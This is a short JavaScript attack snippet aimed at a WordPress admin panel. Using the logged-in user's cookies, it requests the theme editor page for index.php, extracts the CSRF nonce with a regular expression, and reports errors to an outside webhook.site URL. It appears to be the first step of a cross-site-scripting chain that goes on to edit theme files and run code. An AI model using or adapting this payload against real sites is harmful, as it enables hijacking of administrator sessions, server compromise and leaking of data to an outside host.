try{
  
  var a = await fetch('https://localhost:1024/wp-admin/theme-editor.php?file=index.php&theme=twentytwentytwo',{"credentials":"include","mode":"cors"}).then(resp=>{return resp.text()}).then(text => {return text.match(/name="nonce" value="([0-9a-f]{10})/)});
  
}catch(err){
  fetch("https://webhook.site/695fb972-c378-4986-b7af-0e8080af2eb8?"+err);
}
